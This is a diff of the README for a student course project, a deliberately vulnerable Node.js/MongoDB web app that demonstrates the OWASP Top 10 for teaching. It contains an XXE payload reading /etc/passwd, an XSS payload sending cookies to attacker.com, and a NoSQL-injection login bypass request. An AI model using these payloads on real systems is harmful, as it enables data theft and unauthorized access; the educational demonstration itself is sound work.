@@ -1,10 +1,10 @@
-## Vulnerable RESTful Web App with Node.js, Express, and MongoDB
+# Vulnerable RESTful Web App with Node.js, Express, and MongoDB
 
 final project by *Xue Zou*, <br>
 Course Cyber-security from Vanderbilt University, <br>
 fall 2019, taught by *Dr.Christopher Jules White* 
 
-### Goal
+## Goal
 Design a web app with Node.js, Express, and MongoDB and RESTful APIs and demonstrate the **OSWAP Top Ten** on it.
 
 #### Table of Contents
@@ -12,21 +12,20 @@ Design a web app with Node.js, Express, and MongoDB and RESTful APIs and demonst
 - [OWASP Top 10](#owasp-top-10)
 - [About the Web App](#about-the-web-app)
 - [Vulnerabilities of the Web App](#vulnerabilities-of-the-web-app)
-- [Run](#run)
 - [Progress Outline](#progress-outline--answer-to-heilmeier-questions)
 - [Clickjacking Vulnerability on YES](#an-interesting-clickjacking-vulnerability-on-vanderbilt-system-yes)
 
-### OWASP Top 10
+## OWASP Top 10
 
-##### Current official release [OWASP Top 10 2017](https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf)
+#### Current official release [OWASP Top 10 2017](https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf)
 
-##### what is [OWASP](www.owasp.org)?
+#### what is [OWASP](www.owasp.org)?
 
 The Open Web Application Security Project, or OWASP, is a open non-profit community dedicated to improving the security of software. Their mission is to make software security visible, such that individuals and organizations are able to make informed decisions. 
 
 One of OWASP's core principle is free and open, as all of the OWASP tools, documents, forums, and chapters are free and open to anyone interested in improving application security. One of their best-known project is the OWASP Top 10.
 
-##### what is [OWAWP Top 10](https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project)?
+#### what is [OWAWP Top 10](https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project)?
 
 The OWASP Top 10 is a regularly-updated report outlining security concerns for web application security, representing a broad consensus about what the 10 most critical web application security flaws are. The report is put together by a team of security professionals from all over the world. OWASP refers to the Top 10 as an ‘awareness document’ and they recommend that all companies incorporate the report into their processes in order to mitigate security risks.
 
@@ -52,39 +51,86 @@ Below are the security risks reported in the OWASP Top 10 2017 report:
 
 4. **XML External Entities (XXE)**
     
-    This attack relates a XML-based web application. This input can reference an external entity, attempting to exploit a vulnerability in the parser. An ‘external entity’ in this context refers to a storage unit, such as a hard drive. An XML parser can be duped into sending data to an unauthorized external entity, which can pass sensitive data directly to an attacker.
+    XXE attack is against an application that parses XML input. XML, or eXtensible Markup Language, is a markup language used to describe the structure of a document. An entity is an XML document maps some name to a value. An ‘external entity’ in this context refers to a storage unit, such as a hard drive, which is declared with a URI that is dereferenced and evaluated during XML processing. An vulnerable XML processors can be duped into sending data to an unauthorized external entity, which can pass sensitive data directly to an attacker. For example,
+    ```
+    <?xml version="1.0" encoding="ISO-8859-1"?>
+      <!DOCTYPE foo [
+      <!ELEMENT foo ANY >
+      <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+      <foo>&xxe;</foo>
+    ```
+    Here content of /etc/passwd will be stored in xxe, which can be later transfered back to the attacker, thus revealing sensitive information.
 
-    To mitigate XEE attacks, the easiest way is to use less complex data formats such as JSON, and avoiding serialization of sensitive data, or at the very least to patch XML parsers and disable the use of external entities in an XML application.
+    To mitigate XEE attacks, the easiest way is to use less complex data formats such as JSON, and to avoid serialization of sensitive data, or at the very least to configure XML parser properly and disable the use of external entities in an XML application.
 
 5. **Broken Access Control**
 
+    [Access control](https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html) enforces policy such that users cannot act outside of their intended permissions. Broken access control typically lead to unauthorized information disclosure, modification or destruction of all data. For example, a user could login as another user just by changing the part of the url.
+
+    Exploitation of access control is a core skill of attackers, who would try to act as users or administrators, use privileged functions, or mess around with every record. Access controls can be secured by automated detection and effective functional testing by application developers.
+
 6. **Security Misconfiguration**
+
+    This is probably the most common mistakes developers might unintentionally make. This vulnerability allows an attacker to accesses default accounts, unused pages, unpatched flaws, unprotected files and directories, etc. to gain unauthorized access to or knowledge of the system. For instance, an application server’s configuration allows detailed error messages, e.g. stack traces, to be returned to users, which potentially exposes sensitive information or underlying flaws.
+
+    The configuration mistakes could me mitigated by removing any unused features and frameworks and ensuring that error messages are more general. Moreover, developers and system administrators need to work together to ensure that the entire stack is configured properly.
 
 7. **Cross-Site Scripting (XSS)**
 
+    XSS flaws occur whenever an application takes untrusted data and sends it to a web browser without proper validation or escaping. XSS allows attackers to execute scripts in the victims' browser, which can access any cookies, session tokens, or other sensitive information retained by the browser, or redirect user to malicious sites. According to OWASP, XSS is the second most prevalent issue in the Top 10, and is found in around two-thirds of all applications. 
+
+    For example, the application uses untrusted data in the construction of the following HTML snippet without validation or escaping: `(String) page += "<input name='creditcard' type='TEXT' value='" + request getParameter("CC") + "'>";` The attacker modifies the ‘CC’ parameter in the browser to: `'><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi? foo='+document.cookie</script>'.` This attack causes the victim’s session ID to be sent to the attacker’s website.
+
+    To mitigate XSS, whitelist input validation and data sanitization are essential. Using modern web development frameworks like ReactJS and Ruby on Rails also provides some built-in XSS protection.
+
 8. **Insecure Deserialization**
+    
+    Applications and APIs will be vulnerable if they deserialize hostile or tampered objects supplied by an attacker, and can result in serious consequences like DDoS attacks and remote code execution attacks.
+    
+    To protect against insecure deserialization, although monitoring deserialization and implementing type checks would help, the only safe way is to should never accept serialized objects from untrusted sources and to prohibit the deserialization of data from untrusted sources. 
 
 9. **Using Components with known Vulnerabilities**
 
+    Components could be libraries, frameworks, and other software modules. Since these components always run with full privileges, if components with known vulnerabilities are exploited, such an attack can seriously affect the application. 
+
+    To minimize the risk of running components with known vulnerabilities, developers should remove unused dependencies and unnecessary features, components, files or documentation from their projects, as well as ensuring that they are monitoring and receiving components from a trusted source and ensuring they are secure and up to date. 
+
 10. **Insufficient Logging & Monitoring**
 
+    Many web applications are not taking enough steps to detect data breaches, which means the release of confidential, private, or otherwise sensitive information into an unsecured environment. In 2016, identifying a breach took an average of 191 days, which gives attackers a lot of time to cause damage before there is any response. 
+
+    Since attackers rely on the lack of monitoring and timely response to
+    achieve their goals without being detected, OWASP recommends that web developers should implement logging and monitoring as well as incident response plans to ensure that they are made aware of attacks on their applications.
 
 
-### About the Web App
+## About the Web App
 
-The app is developed with and NonSQL database MongoDB
+The starting point of this web app is from [here](https://github.com/cwbuecheler/node-tutorial-2-restful-app), which is a simple nodeJS web app with a list of all users. Then to make it a functional web application, I added user authentication, user creation without duplicates, data modification, session persistent etc. The app is developed in node.js and express and connected to NonSQL database MongoDB. 
 
-The contents are
-* /public - static directories suchs as /images
-* /routes - route files
-* /views - views
-* README.md - this file
-* app.js - central app file 
-* package.json - package info
+The directories of the app are
+* [/public](./public) - static directories such as /images, currently including js which includes all the client interactions and css files
+* [/routes](./public) - route files which implements the APIs and routes
+* [/views](./views) - views powered by jade template engine
+* [README.md](README.md) - this file
+* [app.js](app.js) - central app file 
+* [package.json](package.json) - package info
+
+#### Run
+
+To connect to local mongoDB, for example, I have `mongod --dbpath ~/Documents/mongo/db`.
+
+To run the code, git clone and first run `npm install` to install all all required dependencies. Then, run `npm run live` to run the node server with nodemon and go to `http://localhost:3000` for user interface and `http://localhost:3000/admin` for admin interface.
+
+Here are some sample illustrations. Login Interface and user interface. Modifying corresponding field in the lower right boxes would update the database.
+
+<img src="./illustrations/login.png" width="49.6%" /> <img src="./illustrations/logout.png" width="49.6%" />
+
+Admin Interface: Clicking the username of a user would display user info on the left box
+
+<img src="./illustrations/admin.png" width="54%" />
 
 
-
-### Vulnerabilities of the Web App
+## Vulnerabilities of the Web App
 
 Here I would list how to exploit these vulnerabilities on the application and also propose some solutions.
 
@@ -95,11 +141,11 @@ Here
 
 2. **Broken Authentication**
 
-The admin interface is accessible by anyone.
+<!-- The admin interface is accessible by anyone. -->
 
 3. **Sensitive Data Exposure**
-
-The password is stored as plaintext in database
+<!-- 
+The password is stored as plaintext in database and sent as plaintext over the nextwork requests. -->
 
 4. **XML External Entities (XXE)**
 5. **Broken Access Control**
@@ -131,7 +177,22 @@ because of express parser (or body parser)
 
 do
 ```javascript 
-await fetch("http://localhost:3000/users/session", {"credentials":"include","headers":{"accept":"application/json, text/javascript, */*; q=0.01","accept-language":"en,zh-CN;q=0.9,zh;q=0.8","cache-control":"no-cache","content-type":"application/x-www-form-urlencoded; charset=UTF-8","pragma":"no-cache","sec-fetch-mode":"cors","sec-fetch-site":"same-origin","x-requested-with":"XMLHttpRequest"},"referrer":"http://localhost:3000/","referrerPolicy":"no-referrer-when-downgrade","body":"username[$gt]=&password[$gt]=","method":"POST","mode":"cors"});
+await fetch("http://localhost:3000/users/session", 
+  {"credentials":"include",
+   "headers":
+    {"accept":"application/json, text/javascript, */*; q=0.01",
+     "accept-language":"en,zh-CN;q=0.9,zh;q=0.8",
+     "cache-control":"no-cache",
+     "content-type":"application/x-www-form-urlencoded; charset=UTF-8",
+     "pragma":"no-cache",
+     "sec-fetch-mode":"cors",
+     "sec-fetch-site":"same-origin",
+     "x-requested-with":"XMLHttpRequest"},
+   "referrer":"http://localhost:3000/",
+   "referrerPolicy":"no-referrer-when-downgrade",
+   "body":"username[$gt]=&password[$gt]=",
+   "method":"POST",
+   "mode":"cors"});
 ```
 
 POST /users/session
@@ -157,42 +218,27 @@ in the console
 How to avoid
 
 
-### Run
+## Progress Outline / Answer to Heilmeier questions
 
-To connect to local mongoDB, for example, I have `mongod --dbpath ~/Documents/mongo/db`.
+There are already some vulnerable web apps written in NodeJS, such as [dvna](https://github.com/appsecco/dvna) or [vulnerable-node](https://github.com/cr0hn/vulnerable-node), which uses SQL database or [OWASP's NodeGoat](https://github.com/OWASP/NodeGoat), which is a super large and well-maintained project to play around.
 
-To run the code, git clone and first run `npm install` to install all all required dependencies. Then, run `npm run live` to run the node server and go to `http://localhost:3000` for user interface and `http://localhost:3000/admin` for admin interface.
+This project is different from the projects listed. Firstly it is implemented with mongoDB, and secondly it focus on not only vulnerabilities but also simpleness, with super simple UI interface and back-end APIs to play around with. This vulnerable application could be used to develop, to demonstrate, to fix and to test against. And it sets up an environment to learn how OWASP Top 10 security risks might apply to web applications developed using Node.js and how to possibly address them.
 
-Here are some illustrations:
+The project would take the later half of the course. To check the mid-term success, I want to finish most of 10 identifications and demonstrations of the vulnerabilities in the above part [Vulnerabilities of the Web App](#vulnerabilities-of-the-web-app). For final exam for this project, I am going to demonstrate the project in a final informative video below and finish the final writeup.
 
-
-
-
-### Progress Outline / Answer to Heilmeier questions
-
-There are already some vulnerable web apps written in NodeJS, such as [dvna](https://github.com/appsecco/dvna) or [vulnerable-node](https://github.com/cr0hn/vulnerable-node) or [OWASP's NodeGoat](https://github.com/OWASP/NodeGoat).
-
-The goal of this project is different from those, as it focus on writing really vulnerable nodejs web app to play around with super simple UI interface and back-end APIs.
-
-The vulnerable application could be used to educate, develop and test against. 
-
-The project would take the later half of the course. To check the mid-term success, I want to finish all 10 identifications and demonstrations of the vulnerabilities. For final exam for this project, I am going to demonstrate the project in a final informative video and finish the final writeup.
-
-### Final Video demo
+## Final Video demo
 
 Leave this for later. 
 
-
-### References
+## References
 1. Code starter reference from [Learn the basics of REST and use them to build an easy, fast, single-page web app.](https://github.com/cwbuecheler/node-tutorial-2-restful-app)
 2. More about [OWASP top 10](https://www.cloudflare.com/learning/security/threats/owasp-top-10/)
 3. [Injection attack with mongoDB and nodeJS](https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html)
 
-### An interesting Clickjacking vulnerability on Vanderbilt system YES
+## An interesting Clickjacking vulnerability on Vanderbilt system YES
 
 This is not part of my final project but I want to also share my process of discovery here. Please visit *[clickjacking](./clickjacking)* if interested.
 
----
 <!-- 
 npm install
 ```
